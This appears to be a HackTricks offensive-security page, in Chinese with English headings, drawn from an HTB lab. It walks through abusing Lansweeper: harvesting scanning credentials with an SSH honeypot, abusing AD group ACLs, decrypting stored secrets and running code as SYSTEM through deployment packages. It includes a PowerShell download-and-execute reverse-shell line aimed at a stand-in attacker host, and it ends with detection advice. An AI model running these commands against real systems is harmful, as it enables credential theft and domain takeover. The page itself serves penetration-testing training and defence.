# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper 是一个常见于 Windows 环境并与 Active Directory 集成的 IT 资产发现与清单平台。配置在 Lansweeper 中的凭证被其扫描引擎用于通过 SSH、SMB/WMI 和 WinRM 等协议对资产进行身份验证。错误配置常导致：

- 通过将扫描目标重定向到攻击者控制的主机（honeypot）被拦截凭证
- 滥用由 Lansweeper 相关组暴露的 AD ACLs 以获得远程访问
- 在宿主上解密 Lansweeper 配置的 secrets（连接字符串和存储的扫描凭证）
- 通过 Deployment 功能在被管理端点上执行代码（通常以 SYSTEM 运行）

本页总结了在实战中滥用这些行为的实用攻击者工作流和命令。

## 1) Harvest scanning credentials via honeypot (SSH example)

思路：创建一个指向你主机的 Scanning Target，并将已有的 Scanning Credentials 映射到该目标。当扫描运行时，Lansweeper 会尝试使用这些凭证进行认证，你的 honeypot 将捕获这些尝试凭证。

步骤概览（web UI）：
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
针对 DC 服务验证捕获的凭据：
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
注意事项
- 当你能将扫描器诱导到你的监听器时，对其他协议的做法类似（SMB/WinRM honeypots 等）。SSH 通常是最简单的。
- 许多扫描器会用明显的客户端横幅标识自己（例如 RebexSSH），并且会尝试一些无害命令（uname、whoami 等）。

## 2) AD ACL abuse: 通过将自己添加到应用管理员组来获取远程访问权限

使用 BloodHound 从被攻陷的账户枚举有效权限。常见发现是某个针对扫描器或应用的组（例如 “Lansweeper Discovery”）对一个特权组（例如 “Lansweeper Admins”）拥有 GenericAll。如果该特权组也是 “Remote Management Users” 的成员，一旦我们将自己添加进去，WinRM 就会可用。

收集示例：
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
使用 BloodyAD (Linux) 在组上利用 GenericAll：
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
然后获取一个 interactive shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
提示：Kerberos 操作对时间敏感。如果触发 KRB_AP_ERR_SKEW，先与 DC 同步：
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 在主机上解密 Lansweeper 配置的 secret

在 Lansweeper 服务器上，ASP.NET 站点通常会存储一个加密的连接字符串和应用程序使用的对称密钥。获得合适的本地访问权限后，你可以解密数据库连接字符串，然后提取存储的扫描凭据。

典型位置：
- Web 配置：`C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- 应用程序密钥：`C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

使用 SharpLansweeperDecrypt 来自动化解密并导出存储的凭据：
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
预期输出包括 DB 连接详情以及明文扫描凭据，例如在整个资产中使用的 Windows 和 Linux 账户。这些账户通常在域主机上具有提升的本地权限：
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
使用恢复的 Windows scanning creds 获取特权访问：
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper 部署 → SYSTEM RCE

作为“Lansweeper Admins”的成员，web UI 会显示 Deployment 和 Configuration。在 Deployment → Deployment packages 下，你可以创建会在目标资产上运行任意命令的包。执行由 Lansweeper 服务以高权限执行，从而在所选主机上获得以 NT AUTHORITY\SYSTEM 身份运行的代码执行。

高层步骤：
- 创建一个新的 Deployment package，运行 PowerShell 或 cmd 的一行命令（reverse shell、add-user 等）。
- 选择目标资产（例如运行 Lansweeper 的 DC/主机），然后点击 Deploy/Run now。
- 以 SYSTEM 权限接收你的 shell。

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- 部署操作会产生噪音并在 Lansweeper 和 Windows 事件日志中留下日志。谨慎使用。

## 检测与加固

- 限制或移除匿名 SMB 枚举。监控 RID cycling 和对 Lansweeper 共享的异常访问。
- 出站控制：阻止或严格限制扫描器主机的出站 SSH/SMB/WinRM。对非标准端口（例如 2022）和像 Rebex 这样的异常客户端 banner 发出告警。
- 保护 `Website\\web.config` 和 `Key\\Encryption.txt`。将 secrets 外置到 vault 并在暴露时进行轮换。考虑使用最小权限的服务账户和在可行时使用 gMSA。
- AD 监控：对与 Lansweeper 相关的组（例如 “Lansweeper Admins”、“Remote Management Users”）的更改触发告警，以及对授予特权组 GenericAll/Write 成员资格的 ACL 更改触发告警。
- 审计 Deployment 包的创建/更改/执行；对生成 cmd.exe/powershell.exe 或发起异常出站连接的包发出告警。

## 相关主题
- SMB/LSA/SAMR 枚举和 RID cycling
- Kerberos 密码喷洒以及时钟偏差的相关注意事项
- 使用 BloodHound 对 application-admin 组进行路径分析
- WinRM 使用与横向移动

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
